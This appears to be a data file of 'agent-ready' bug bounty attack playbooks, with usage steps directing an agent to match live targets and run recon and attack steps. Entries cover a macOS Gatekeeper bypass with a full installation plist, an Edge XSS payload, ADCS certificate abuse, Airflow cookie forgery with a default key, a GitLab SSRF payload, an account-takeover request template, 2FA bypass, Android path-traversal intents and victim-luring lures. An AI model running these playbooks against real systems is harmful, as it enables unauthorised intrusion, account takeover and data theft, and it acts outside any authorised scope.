description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: M1 Macs GateKeeper bypass aka CVE-2021-30658

trigger_conditions.when_to_apply: This vulnerability is applicable to M1 Macs running macOS Big Sur where Gatekeeper's quarantine mechanisms are bypassed for iOS apps installed via the `itms-services://` URL handler.
prerequisites: Attacker can entice a victim to click a specially crafted link in a web browser.
Attacker can host a web server with a valid SSL certificate.
Attacker can obtain an enterprise certificate to sign the malicious iOS app.
applicability_signals: The target system is an M1 Mac running macOS Big Sur.
The ability to use the `itms-services://` URL scheme for app installation.
skip_if: The target system is not an M1 Mac or is running an older version of macOS that patches this vulnerability.
Gatekeeper's quarantine attribute is applied to applications installed via `itms-services://`.

recon_steps: Verify target is an M1 Mac running macOS Big Sur.
Confirm the `itms-services://` URL handler is functional for app installation.
attack_steps: Step 1: Build a malicious iOS app and sign it with an enterprise certificate.
Step 2: Export the project to an `.ipa` archive.
Step 3: Set up a web server with a valid SSL certificate.
Step 4: Upload the `app.ipa` file, `app.plist` file, and an optional image file (e.g., `image.png`) to the web server.
Step 5: Create an `index.html` file containing links to trigger the app installation process via `itms-services://`.
Step 6: Host the `index.html` file on the web server.
Step 7: Provide the victim with the URL to the `index.html` file.

payloads_or_patterns.content:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>items</key>
  <array>
    <dict>
      <key>assets</key>
      <array>
        <dict>
          <key>kind</key>
          <string>software-package</string>
          <key>url</key>
          <string>https://<YOUR_SERVER_ADDRESS>/app.ipa</string>
        </dict>
        <dict>
          <key>kind</key>
          <string>display-image</string>
          <key>url</key>
          <string>https://<YOUR_SERVER_ADDRESS>/image.png</string>
        </dict>
        <dict>
          <key>kind</key>
          <string>full-size-image</string>
          <key>url</key>
          <string>https://<YOUR_SERVER_ADDRESS>/image.png</string>
        </dict>
      </array>
      <key>metadata</key>
      <dict>
        <key>bundle-identifier</key>
        <string>blog.wojciechregula.totallynotmalware</string>
        <key>bundle-version</key>
        <string>6.0</string>
        <key>kind</key>
        <string>software</string>
        <key>subtitle</key>
        <string>18B79</string>
        <key>title</key>
        <string>TotallyNotMalware</string>
      </dict>
    </dict>
  </array>
</dict>
</plist>

tools_recommended: Xcode: To build and export the iOS app.
Web Server (e.g., Nginx, Apache): To host the malicious files.
SSL Certificate: For secure hosting of the web server.
success_indicators: The malicious iOS app is installed on the M1 Mac without triggering Gatekeeper's usual security prompts or warnings.
The installed app executes its malicious payload (e.g., arbitrary code execution).
failure_indicators: Gatekeeper prompts the user to confirm installation or displays a warning about the unsigned app.
The app installation fails with an error.
The `itms-services://` handler does not trigger the installation of the app.

playbooks.impact: Remote Code Execution on M1 Macs without user awareness or elevation of privileges, bypassing security controls like Gatekeeper.
playbooks.key_lesson: Always verify that applications installed via custom URL schemes are subject to the same security checks (e.g., quarantine, notarization) as applications installed through standard means.

meta.title: Video PoC

trigger_conditions.when_to_apply: When a specific vulnerability (CVE-2021-34506) is present in Microsoft Edge, which allows for Universal XSS.
prerequisites: The target system must be running a vulnerable version of Microsoft Edge.
applicability_signals: The existence of CVE-2021-34506 and its associated exploit.
skip_if: The target system is not running a vulnerable version of Microsoft Edge.
The vulnerability has been patched.

recon_steps: Step 1: Identify the version of Microsoft Edge being used by the target user.
Step 2: Check if the identified version is vulnerable to CVE-2021-34506.
attack_steps: Step 1: Craft a malicious HTML or JavaScript payload designed to exploit CVE-2021-34506.
Step 2: Deliver the payload to the target user, for example, via a link in an email or a compromised website.
Step 3: When the target user opens the crafted payload in the vulnerable Microsoft Edge browser, the XSS will be executed.
tools_recommended: insufficient detail in writeup
success_indicators: Execution of arbitrary JavaScript code in the context of the victim's browser session.
failure_indicators: The payload does not execute, or an error occurs. This indicates the exploit is not working or the browser version is not vulnerable.

playbooks.impact: Execution of arbitrary JavaScript code in the context of the victim's browser session, potentially leading to session hijacking, data theft, or further exploitation.
playbooks.key_lesson: Focus on specific, identified CVEs for browser vulnerabilities and understand the conditions under which they can be exploited.

meta.title: Certified Pre-Owned

tech_stack_fingerprints: SpecterOps website content mentioning Active Directory, ADCS, BloodHound

trigger_conditions.when_to_apply: When an attacker has a foothold within an Active Directory domain and can interact with ADCS, potentially leading to domain compromise.
prerequisites: Attacker has authenticated access to an Active Directory domain.
applicability_signals: Presence of Active Directory Certificate Services (ADCS) within the domain.
skip_if: ADCS is not deployed or configured within the target Active Directory environment.

recon_steps: Step 1: Identify ADCS configuration using tools like BloodHound or custom PowerShell scripts to map certificate templates and their permissions.
attack_steps: Step 1: Enumerate certificate templates with weak permissions (e.g., 'Enroll' or 'Full Control' for authenticated users or specific groups).
Step 2: If a vulnerable template is found, enroll a certificate using a compromised user account.

Step 3: If the template allows for specific applications or subject names to be specified, attempt to enroll for a certificate for a privileged account (e.g., Domain Admins or specific service accounts).
Step 4: Use the enrolled certificate to authenticate as the privileged account or to impersonate it, potentially gaining administrative access.
payloads_or_patterns: Insufficient detail in writeup. Actual payloads would depend on the specific ADCS configuration and chosen attack vector (e.g., Kerberoasting with a rogue CA, template manipulation).
tools_recommended: BloodHound: For mapping AD relationships and identifying ADCS misconfigurations.
certipy: For interacting with ADCS and enrolling certificates.
Mimikatz: For extracting credentials or performing other post-exploitation actions.
success_indicators: Successful enrollment of a certificate for a high-privilege identity.
Ability to use the obtained certificate to authenticate as a privileged user.
Gaining administrative access to domain controllers or other critical systems.
failure_indicators: ADCS is not deployed or accessible.
All certificate templates have strict enrollment permissions.
Enrollment attempts are logged and blocked by security controls.

playbooks.impact: Attacker can gain elevated privileges within the Active Directory domain, potentially leading to full domain compromise, exfiltration of sensitive data, and deployment of ransomware.
playbooks.key_lesson: Always audit Active Directory Certificate Services (ADCS) for weak enrollment permissions on certificate templates, as these can be a direct path to domain administrator privileges.

meta.title: HTML Injection and a dream in Google Chrome for Linux

trigger_conditions.when_to_apply: When an attacker has access to a victim's logged-in Google Chrome profile and physical access to their device.
prerequisites: Victim is logged into their Google Chrome account.
Attacker has physical access to the victim's device.
applicability_signals: The 'Customize Profile' button is available next to the user's avatar in the Chrome browser.
The application allows arbitrary input for the Chrome profile name.
skip_if: The target environment does not allow user profile customization.
The input field for the profile name sanitizes HTML tags.

recon_steps: Navigate to the Google Chrome profile settings after logging in.
Observe the 'Customize Profile' button and associated input fields.
attack_steps: Step 1: Access the Google Chrome profile customization settings.
Step 2: Input the HTML injection payload into the 'Name your Chrome profile' field.
Step 3: Trigger the creation of a new profile or a re-login scenario.
Step 4: Observe the behavior of the browser and the rendered content in the new profile context.
tools_recommended: Google Chrome Browser (Version 91.0.4472.101 for Linux)
success_indicators: The injected HTML content is rendered in the new profile's tab.
The browser crashes with 'Browser Crash' status and specific error messages, indicating execution of Java Runtime commands.
failure_indicators: The input is sanitized and no HTML is rendered.
No browser crash or unexpected behavior occurs after applying the payload.
The profile creation process fails without error.

playbooks.impact: The attacker can inject arbitrary HTML content into the user's Chrome profile customization area, potentially leading to phishing, defacement, or as demonstrated, a browser crash by attempting to execute Java Runtime commands.
playbooks.key_lesson: Always sanitize user-provided input for profile names and other fields in applications, especially when the application interacts with system commands or sensitive user data.

meta.title: Why dynamic code loading could be dangerous for your apps: a Google example

tech_stack_fingerprints: AndroidManifest.xml with android:grantUriPermissions="true" on a ContentProvider

trigger_conditions.when_to_apply: When an Android application exposes a ContentProvider with `android:grantUriPermissions="true"` and this ContentProvider handles file operations with insufficient path validation, allowing an attacker to write arbitrary files.
prerequisites: The target application must be installed on the same device as the attacker's application.
The attacker's application must be able to launch intents to interact with the target application's ContentProvider.
applicability_signals: An Android app uses a ContentProvider with the `android:grantUriPermissions` attribute set to `true`.
Inspection of the ContentProvider's implementation reveals it handles `openFile` or similar file operations.
The `openFile` method's implementation allows for path traversal or writing to arbitrary locations within the app's private data directory.
skip_if: ContentProvider does not expose file writing capabilities.
ContentProvider strictly validates all file paths and prevents traversal.

recon_steps: Step 1: Analyze the target Android application's manifest file (`AndroidManifest.xml`) for ContentProviders that have `android:grantUriPermissions` set to `true`.
Step 2: Decompile the target application to inspect the Java/Kotlin code for the identified ContentProvider(s) and locate methods that handle file operations (e.g., `openFile`, `insert`, `update`).
attack_steps: Step 1: Identify a ContentProvider (e.g., `com.google.android.apps.gsa.contentprovider.CommonContentProvider`) that allows file writing and has `android:grantUriPermissions="true"`.

Step 2: Craft an Intent to call the `openFile` method on the identified ContentProvider, specifying a target file path that includes path traversal elements (e.g., `../../../../../../../some_file`). The `uri.getLastPathSegment()` in the writeup suggests that the last part of the URI is used as the filename.

Step 3: The `openFile` method in `C29246g` creates a `File` object within `/data/data/com.google.android.googlequicksearchbox/files/ScreenAssistScreenshots/`. By using path traversal in the `uri`, an attacker can write files outside of this directory, potentially overwriting existing files or creating new ones.

Step 4: To achieve code execution, the attacker would need to identify a file that, when overwritten, leads to code execution. In the Google app example, this involved writing a Google Play Core library module.
payloads_or_patterns: Intent action: `android.content.action.VIEW` or custom actions if documented/discovered.

Intent data URI: `content://<authority>/<path_with_traversal>/<filename>` (e.g., `content://com.google.android.googlequicksearchbox.CommonContentProvider/../../../../../../../data/data/com.google.android.googlequicksearchbox/shared_prefs/google_prefs.xml` to overwrite a preference file, or a path to a dynamic code loading module).
tools_recommended: Android Debug Bridge (ADB) for interacting with the device and app.
APKTool for decompiling Android applications.
Jadx or other Java decompilers to analyze Java/Kotlin code.
Custom Android application to craft and send intents.
success_indicators: Successfully writing a file to an arbitrary location on the device. This can be verified by checking for the existence of the file or its content using ADB.
If overwriting a file that affects app behavior, observing a change in the app's functionality.
Achieving persistent local code execution within the vulnerable app.
failure_indicators: Receiving an `IllegalArgumentException` or `FileNotFoundException` indicating the path is invalid or the file cannot be created/opened.
The ContentProvider returns an error code or message indicating permission denial or invalid parameters.
No observable change in the target app's behavior after attempting to write a file.

playbooks.impact: Arbitrary file write allows an attacker to overwrite sensitive files within the application's data directory or even system files if the app has elevated privileges. This can lead to data theft (e.g., credentials, user data), denial of service, or persistent code execution if the overwritten file is critical for the app's operation (e.g., configuration files, dynamic code loading modules). In the Google app example, this led to the potential theft of sensitive user data and persistent local code execution.
playbooks.key_lesson: Always validate file paths rigorously when handling file operations within ContentProviders, especially if `android:grantUriPermissions` is enabled. Prevent path traversal attacks by sanitizing input URIs and ensuring files are written only to intended, secure locations.

meta.title: Unauthenticated Gitlab SSRF

trigger_conditions.when_to_apply: When the GitLab CI Lint API is exposed and accessible without authentication, and internal network requests are enabled.
prerequisites: GitLab CI Lint API is accessible without authentication.
GitLab instance has internal network requests enabled.
applicability_signals: The `/api/v4/ci/lint` endpoint responds to unauthenticated POST requests.
The API accepts a JSON payload with a `content` field for CI/CD configuration.
skip_if: The `/api/v4/ci/lint` endpoint requires authentication.
All requests to internal IP addresses (e.g., 127.0.0.1) are blocked by network configuration or firewall.

recon_steps: Step 1: Check for the existence of the `/api/v4/ci/lint` endpoint by sending an unauthenticated POST request with a minimal valid JSON payload.
Step 2: Send a POST request to `/api/v4/ci/lint` with a valid CI/CD YAML configuration to confirm it processes the content and returns a 'valid' or 'invalid' status.
attack_steps: Step 1: Craft a JSON payload for the `/api/v4/ci/lint` endpoint. Include `"include_merged_yaml": true` and a `"content"` field. Inside the `"content"` field, define a `"include"` directive with a `"remote"` URL pointing to an internal IP and port that might host sensitive services (e.g., `http://127.0.0.1:9090/api/v1/targets?test.yml`).
Step 2: Send the crafted payload via a POST request to `<TARGET_URL>/api/v4/ci/lett`.

Step 3: Analyze the response. Look for indicators that the `include` directive was processed and an attempt was made to reach the internal URL. The `merged_yaml` field in the response might contain data leaked from the internal service, or errors might indicate interaction with the internal network.
tools_recommended: curl: To send crafted HTTP requests.
Burp Suite: To intercept and modify requests, and potentially to host services for detecting callbacks.
success_indicators: The response contains a `merged_yaml` field with data originating from the internal target (e.g., Prometheus targets).
Error messages in the response suggest that the CI lint process attempted to resolve or interact with the specified internal URL.
failure_indicators: A 401 or 403 status code on the `/api/v4/ci/lint` endpoint indicates authentication is required or the endpoint is blocked.
The response always shows `status: valid` with no `merged_yaml` and no errors related to the remote include, suggesting internal network access is restricted or the provided URL is not accessible.
If no internal network requests are enabled, the `include` directive will not be processed for remote URLs pointing to internal addresses.

playbooks.impact: An unauthenticated attacker can perform Server-Side Request Forgery (SSRF) by exploiting the unauthenticated CI Lint API, allowing them to access internal services and potentially exfiltrate sensitive data, such as Prometheus targets or other internal API endpoints.
playbooks.key_lesson: Always validate if unauthenticated API endpoints that process user-supplied configuration or content can be abused for SSRF by including remote URLs.

meta.title: How We Are Able To Hack Any Company By Sending Message – $20,000 Bounty [CVE-2021–34506]

tech_stack_fingerprints: Browser has an internal translation feature

trigger_conditions.when_to_apply: When a web page requires translation in Microsoft Edge and the internal translator is enabled.
prerequisites: Microsoft Edge browser in use
Internal translation feature is active and configured to translate pages
Attacker can influence the content of a page that will be translated
applicability_signals: Browser's translation prompt appears for a page
Developer console shows logs related to translation initiation
skip_if: Browser does not have an internal translator or it is disabled
Pages are already in the user's preferred language
Content Security Policy prevents external script execution or XSS payloads

recon_steps: Step 1: Browse to a target webpage using Microsoft Edge. Observe if the browser prompts for translation or if the translation feature is automatically invoked.
Step 2: Examine the browser's developer console for any messages or errors related to the translation process. Look for function calls like `Microsoft.JS.startPageTranslation`.
attack_steps:
Step 1: Craft an HTML file containing text and a malicious XSS payload, for example: `SOME TEXT IN DIFFERENT LANGUAGE
Políticas de Privacidade Usaremos seus dados pessoais para resolver disputas, solucionar problemas e aplicar nossos Termos e Condições de Uso.
Para prevenir abusos no app/site, o Badoo usa decisões automáticas e moderadores para bloquear contas, como parte de seu procedimento de moderação. Para isso, nós conferimos contas e mensagens para encontrar conteúdo que indicam quebra dos nossos Termos e Condições de Uso. Isso é feito através de uma <img src=x onerror=alert(1)>`.
Step 2: Serve this crafted HTML file locally or host it on a controlled server accessible by the target.

Step 3: Instruct the target user to navigate to this crafted HTML file using Microsoft Edge, or ensure they visit a page controlled by the attacker that contains this malicious content and triggers the translation feature.
Step 4: Observe if the XSS payload executes, indicated by an `alert()` box or other JavaScript execution.
tools_recommended: Burp Suite: To host the crafted HTML file and monitor network traffic.
Any web server: For serving the malicious HTML content.
success_indicators: An alert box pops up with the message 'alert(1)' or similar JavaScript execution.
The browser's developer console shows output from executed JavaScript (e.g., `document.domain`, `document.cookie`).
failure_indicators: No alert box appears, and the XSS payload is rendered as plain text. This indicates the input is being properly sanitized or escaped before translation.
A 403 Forbidden error is received if the translation service is blocked by security measures.
The translation feature fails to activate for the crafted page.

playbooks.impact: Attacker can execute arbitrary JavaScript in the context of the translated website, potentially leading to session hijacking, stealing sensitive data, defacing the website, or performing actions on behalf of the user.
playbooks.key_lesson: Always test how browser features, especially those handling user-provided content like translation, sanitize and process input to prevent XSS vulnerabilities.

meta.title: Exploiting outdated Apache Airflow instances

trigger_conditions.when_to_apply: When an Apache Airflow instance is accessible and running an outdated version vulnerable to JWT/cookie manipulation.
prerequisites: Target is running Apache Airflow.
The Airflow instance is accessible via HTTP/S.
The signing key for session cookies has not been rotated from its default 'temporary_key'.
applicability_signals: The presence of a login page for Apache Airflow.
HTTP response from /api/v1/version returns a 404 page (indicating Airflow v1) or a version string (Airflow v2).
The presence of a session cookie that appears to be signed.
skip_if: The Airflow version is confirmed to be v1.10.15 or v2.0.2 or higher.
No session cookie is found.
The application returns a 403 Forbidden error for all requests.

recon_steps: Step 1: Discover exposed Apache Airflow instances. Look for HTTP servers responding on common ports (80, 443, 8080) and check for specific UI elements or headers indicative of Apache Airflow.
Step 2: For identified Airflow instances, attempt to access the login page. Capture any cookies present in the HTTP response, particularly those related to session management.
Step 3: Send a GET request to /api/v1/version. Note the response code and body to infer the Airflow version.
attack_steps: Step 1: Take an unauthenticated session cookie from an Airflow instance.
Step 2: Use the `flask-unsign` tool with the secret key 'temporary_key' to forge a new cookie. Replace the 'user_id' attribute in the cookie payload with '1' (or another suspected admin ID).
Step 3: Set the forged cookie as the 'session' cookie in your browser or HTTP client.
Step 4: Access the Airflow web UI again. If successful, you should be authenticated as the user specified by the forged cookie.
tools_recommended: flask-unsign: To forge session cookies.
Amass: For subdomain discovery.
Burp Suite / OWASP ZAP: For intercepting and modifying HTTP requests/responses, and for cookie manipulation.
success_indicators: Successful login to the Apache Airflow web UI without valid credentials.
Access to administrative sections of the Airflow UI (e.g., viewing environment variables, DAG source code, sensitive keys).
HTTP 200 OK response when accessing protected administrative endpoints after setting the forged cookie.
failure_indicators: 401 Unauthorized or 403 Forbidden responses after setting the forged cookie: Indicates the signing key is not 'temporary_key' or the session mechanism is different.
Cookie validation error: Indicates the cookie format or signature is not recognized.
No change in access level: Still unable to access administrative functions. Suggestion: Try other user IDs, investigate if the signing key has been changed, or look for other vulnerabilities.

playbooks.impact: Unauthorized access to sensitive information (e.g., AWS keys, database credentials, payment processor keys) stored in Airflow environment variables, sensitive DAG source code, or connected data sources. Potential for arbitrary workflow execution or data exfiltration.
playbooks.key_lesson: Always ensure default and sensitive secrets like session signing keys are rotated and properly managed in applications, especially for widely deployed software like Apache Airflow.

meta.title: Privilege escalation on https://dialogflow.cloud.google.com

affected_components: User invitation and role management feature

trigger_conditions.when_to_apply: When an attacker can invite users to a Dialogflow agent and manage their roles.
prerequisites: Attacker has an authenticated session in Dialogflow.
applicability_signals: The ability to navigate to 'Settings -> Share -> invite another user' and assign roles.
skip_if: The system correctly enforces role downgrades and revokes permissions.

recon_steps: Step 1: Access the Dialogflow console at https://dialogflow.cloud.google.com/
Step 2: Navigate to agent settings and observe the user invitation and role management interface.
attack_steps: Step 1: Invite a new user to a Dialogflow agent with a 'Developer' role.
Step 2: Attempt to downgrade the invited user's role from 'Developer' to 'Reviewer'.
Step 3: Apply the role change.
Step 4: Log in as the invited user and attempt to perform actions that should be restricted to the 'Developer' role (e.g., editing agent settings, managing intents).
payloads_or_patterns: N/A (This is a logic flaw in role management, not a payload-based exploit)
tools_recommended: Burp Suite (for observing and manipulating HTTP requests related to role changes)
success_indicators: The invited user retains 'Developer' level permissions (e.g., ability to edit agent settings) despite being assigned the 'Reviewer' role.
failure_indicators: The invited user's permissions are correctly downgraded to 'Reviewer' level, and they can no longer perform 'Developer' actions. Pivot: Investigate other privilege management flows.

playbooks.impact: An attacker can escalate privileges for invited users, allowing them to perform actions beyond their intended role, potentially leading to unauthorized modifications of the Dialogflow agent or data exfiltration.
playbooks.key_lesson: Always verify that role downgrades are correctly implemented and that all associated permissions are revoked when a user's access level is reduced.

meta.title: Story of Account Takeover : Using Social Login with Mass Assignment Vulnerability to hack accounts !

trigger_conditions.when_to_apply: When the target application supports social logins (Facebook/Google) and allows users to sign up/log in via these methods, and the corresponding API endpoint is identified.
prerequisites: Attacker must know the phone number of the victim.
applicability_signals: Intercepted POST request to /signup/users/socialLogin during social login flow.
Presence of a 'mobile' parameter in the JSON request body.
skip_if: The 'mobile' parameter is not present in the social login request.
The application does not have social login functionality.
SSL Pinning cannot be bypassed.

recon_steps: Step 1: Download and install the target mobile application from the Play Store.
Step 2: Bypass SSL Pinning using Frida script.
Step 3: Configure Burp Suite to intercept traffic from the mobile app.
Step 4: Initiate the social login flow (e.g., Login with Facebook) and observe the requests in Burp Suite to identify the relevant API endpoint (e.g., /signup/users/socialLogin).
attack_steps: Step 1: Click on the 'Login with Facebook' button in the app.
Step 2: Authorize the app on Facebook.
Step 3: Intercept the outgoing HTTP request to `/signup/users/socialLogin`.
Step 4: Modify the intercepted request by adding or modifying the `mobile` parameter with the victim's phone number.
Step 5: Forward the modified request.

payloads_or_patterns.request_template:
POST /signup/users/socialLogin HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: <calculated_length>
Host: api.redacted.com
Connection: close

User-Agent: okhttp/4.2.1

{
  "profile_picture": " http://graph.facebook.com/3061xxxxxxxxx/picture?type=large ",
  "emailId": " attacker_controlled_email@example.com ",
  "socialType": "FB",
  "fname": "test",
  "pincode": "",
  "dob": "",
  "mobile": "<VICTIM_PHONE_NUMBER>",
  "city": "",
  "gender": "",
  "androidId": "3c91804d96d13669",
  "deviceToken": "xxxx",
  "appVersion": "1.0.0|10",
  "country": "",
  "socialId": "306199919",

tools_recommended: Burp Suite: For intercepting and modifying HTTP requests.
Frida: For bypassing SSL Pinning on the mobile app.
success_indicators: The victim's account is now associated with the attacker's email address.
The attacker can log into the victim's account using their own credentials or by triggering a password reset flow that uses the newly associated email.
failure_indicators: The API returns an error indicating an invalid phone number format.
The API rejects the request without modifying the account association.
The 'mobile' parameter is not present or is sanitized server-side, preventing mass assignment.

playbooks.impact: Complete account takeover of the victim's financial account, allowing the attacker to access sensitive personal and financial information, perform unauthorized transactions, or exploit other features of the application.
playbooks.key_lesson: When testing applications with social login functionalities, always analyze the parameters sent during the social login callback to identify potential mass assignment vulnerabilities, especially for sensitive fields like email or phone number.

meta.title: Bypassing 2FA using OpenID Misconfiguration

tech_stack_fingerprints: presence of acr_values parameter in OpenID authentication requests

trigger_conditions.when_to_apply: When an OpenID Connect implementation enforces 2FA for a relying party, but the Identity Provider supports alternative authentication methods (like SMS) that are not exposed through the relying party's UI.
prerequisites: Target uses OpenID Connect for authentication.
Relying party enforces 2FA (e.g., Google Authenticator).
applicability_signals: Requests to the Identity Provider contain the `acr_values` parameter.
The `acr_values` parameter includes `otp` and `pwd`.
skip_if: The Identity Provider does not support alternative authentication methods specified in RFC 8176.
All attempts to modify `acr_values` result in persistent 401 errors and do not bypass the 2FA challenge.

recon_steps: Step 1: Intercept login requests to the Identity Provider. Observe the `acr_values` parameter in POST requests.
Step 2: Decode the JWT token received after authentication. Examine the `amr` field for an array of authentication methods used (e.g., `["pwd","otp"]`).
attack_steps: Step 1: During the login flow, modify the `acr_values` parameter in the request to the Identity Provider. Change `otp+password` to `sms+password` (or another supported method from RFC 8176).
Step 2: Proceed with authentication using valid username and password.
Step 3: If prompted for the alternative 2FA method (e.g., SMS code), use a temporary SMS verification service to receive and submit the code.

Step 4: Upon successful verification of the alternative 2FA method, verify if the user is logged in to the relying party without being prompted for the original 2FA method (e.g., Google Authenticator).
tools_recommended: Burp Suite: To intercept and modify HTTP requests, specifically the `acr_values` parameter.
Temporary SMS verification services: To receive one-time codes for alternative 2FA methods.
success_indicators: Successful login to the relying party after authenticating with a method specified in the modified `acr_values` (e.g., SMS code), bypassing the expected 2FA prompt (e.g., Google Authenticator).
failure_indicators: Consistent 401 errors after modifying `acr_values` → The Identity Provider may not support the requested alternative method or the relying party may have stricter validation. Pivot to other `acr_values` or other vulnerabilities.

Redirect to the expected 2FA prompt even after successful alternative 2FA authentication → The relying party might not properly validate the `amr` claim in the JWT or has a hardcoded requirement for a specific 2FA method.

playbooks.impact: Allows an attacker to bypass two-factor authentication for any user by exploiting misconfigurations in the OpenID Connect Identity Provider, potentially leading to unauthorized account access.
playbooks.key_lesson: When testing OpenID Connect implementations, investigate the `acr_values` parameter to identify and exploit alternative authentication methods supported by the Identity Provider but not exposed by the relying party's UI.

meta.title: Two weeks of securing Samsung devices: Part 1

trigger_conditions.when_to_apply: When an Android application exposes exported services that accept URI parameters for file downloads or provisioning.
prerequisites: Attacker can trigger an exported Android service.
The target Android app is installed on a Samsung device.
The service handles a URI parameter that can be controlled by the attacker.
applicability_signals: Exported services in the app's manifest (android:exported="true").
Services that process URI-like parameters for provisioning or file downloads.
Specific service names like 'DualDARInitService'.
skip_if: No exported services found.
All services require authentication or specific permissions not held by the attacker.
URI parameters are properly validated and not susceptible to path traversal or arbitrary URI manipulation.

recon_steps: Analyze the Android application's manifest file (AndroidManifest.xml) to identify exported services.
Examine the code associated with exported services to understand how they process input parameters, especially those that appear to be URIs or file paths.
attack_steps: Step 1: Identify an exported service that accepts a URI parameter for provisioning or file handling, such as com.samsung.android.knox.containercore.provisioning.DualDARInitService.

Step 2: Craft an Intent to trigger this service, providing a malicious URI in the appropriate parameter (e.g., 'dualdar-config-client-location'). This URI should point to a location where the attacker can control the content, or a location that can be exploited by the app's writing mechanism.

Step 3: Observe if the app downloads content from the attacker-controlled URI and writes it to a world-writable or sensitive location on the device (e.g., /sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk).
Step 4: If the file is written, leverage the app's subsequent actions (e.g., automatic app installation) to achieve arbitrary code execution or other malicious outcomes.
payloads_or_patterns: Intent payload targeting 'com.samsung.android.knox.containercore.provisioning.DualDARInitService' with parameter 'dualdar-config-client-location' set to an attacker-controlled URI pointing to a malicious APK or data file.
tools_recommended: Android Debug Bridge (ADB) for interacting with the device and triggering intents.
A local HTTP server to host malicious files accessible via the crafted URI.
Reverse engineering tools (e.g., Jadx) to analyze app code and identify vulnerable components.
success_indicators: The app successfully downloads and writes a file from the attacker-controlled URI to a specified location on the device.
The app proceeds with an action based on the downloaded file, such as attempting to install an APK or modify settings.
The app's behavior changes in a way that indicates successful exploitation (e.g., an unauthorized app is installed, device settings are altered).
failure_indicators: The app fails to download or write the file.
The app throws an error or crashes.
The URI is validated, and the malicious URI is rejected.
Write operations are restricted to sandboxed or protected directories.
Pivot: If file write is confirmed but not to a sensitive location, investigate if that file can be used to trigger another vulnerability.

playbooks.impact: An attacker can trigger the installation of arbitrary applications, potentially with device administrator rights, allowing for full device compromise. Additionally, arbitrary files can be read and written on behalf of a system user (UID 1000), leading to system setting manipulation and data theft.
playbooks.key_lesson: Always analyze exported Android services for URI handling vulnerabilities that can lead to arbitrary file writes and subsequent code execution or privilege escalation.

meta.title: Unexpected IDOR Vulnerability in [REDACTED]

trigger_conditions.when_to_apply: When an authenticated user can access their profile via a URL containing a numeric ID parameter, and this ID can be changed to view other users' profiles.
prerequisites: Attacker must have an authenticated account on the target application.
applicability_signals: Accessing a user profile via a URL like: `https://secure.[redacted].net/welcome.php?dad=domain&jc=profiles&hs=&a=form&id=<USER_ID>`
The presence of a numeric `id` parameter in the profile URL.
skip_if: The `id` parameter is not present in the profile URL.
Changing the `id` parameter results in an error page or a generic 'not found' response for all values.
The application enforces strict authorization checks that prevent unauthorized access to other user profiles.

recon_steps: Step 1: Login to an authenticated account on the target application.
Step 2: Navigate to the user profile section.
Step 3: Observe the URL when viewing a profile, specifically looking for parameters that might identify the user (e.g., `id`).
attack_steps: Step 1: Once logged in, navigate to the profile editing section and identify the vulnerable URL with the `id` parameter.
Step 2: Change the value of the `id` parameter to different numeric values.
Step 3: Observe the response for each changed `id` value to see if another user's profile data is displayed.
tools_recommended: Burp Suite Intruder: To automate the process of changing the `id` parameter to a range of numeric values.
success_indicators: The response displays another user's profile information (e.g., email, phone number, address) instead of an error or the attacker's own profile.
failure_indicators: Receiving a 404 Not Found, 403 Forbidden, or a generic error page for all attempted `id` values. Pivot to trying UUIDs or other ID formats if numeric fails.
Receiving the attacker's own profile data back regardless of the `id` value change. This suggests the ID parameter might not be the direct cause of fetching data or is improperly handled.

playbooks.impact: An attacker can access and view the personal information (email, phone numbers, address, etc.) of other users on the platform, leading to privacy violations and potential for further social engineering or targeted attacks.
playbooks.key_lesson: Always test numeric ID parameters in URLs by substituting values to check for Insecure Direct Object References (IDOR), especially when accessing sensitive user data.

meta.title: Author spoofing in Google Colaboratory

affected_components: Security warning displayed when executing notebooks from other authors
tech_stack_fingerprints: Uses Google Drive for file management and sharing

trigger_conditions.when_to_apply: This technique is applicable when a user is trying to execute a Python-Jupyter-Notebook shared via Google Colaboratory, and the goal is to bypass the security warning that appears when executing code from an unknown author.
prerequisites: Attacker can create a Google Colaboratory notebook.
Attacker can share a Google Drive document (the notebook) with another user.
Attacker can change the ownership of a Google Drive document.
applicability_signals: The target is a Google Colaboratory notebook.
The notebook is shared with a victim.
A security warning is displayed when executing code from an external author.
The ownership of the notebook can be changed via Google Drive settings.
skip_if: The target system does not involve Google Colaboratory notebooks.
The ownership of shared documents cannot be transferred.
No security warning is presented when executing notebooks from external authors.

recon_steps: Step 1: Create a new Google Colaboratory notebook and populate it with malicious Python code.
Step 2: Share the created notebook with the intended victim.
Step 3: Access the notebook's settings via Google Drive and change the owner to the victim.
Step 4: Send the link to the notebook to the victim, prompting them to execute the code.
attack_steps: Step 1: Craft a malicious Python script within a Google Colaboratory notebook.
Step 2: Share the notebook with the target user, granting them edit access or view access.
Step 3: Navigate to the notebook in Google Drive, select 'Share', and transfer ownership to the target user.

Step 4: Provide the victim with the notebook's URL. When they open and attempt to run the code, the security warning will incorrectly attribute the 'author' as the victim, potentially lowering their guard.
payloads_or_patterns: Malicious Python code (e.g., code designed to exfiltrate data, perform unauthorized actions, or establish persistence).
tools_recommended: Google Colaboratory interface
Google Drive interface
success_indicators: The victim executes the malicious code in their Google Colaboratory environment without the expected security warning, or with a misleading warning.
Observable malicious activity resulting from the executed code (e.g., data exfiltration, unauthorized API calls).
failure_indicators: The victim receives the original security warning regardless of ownership transfer, indicating the warning is not solely based on the document owner.
The ownership transfer fails or is not reflected in the Colaboratory interface.

playbooks.impact: Allows an attacker to trick a victim into executing malicious code within their own authenticated Google Colaboratory environment by spoofing the author of the notebook, potentially bypassing security awareness and leading to data compromise or unauthorized actions.
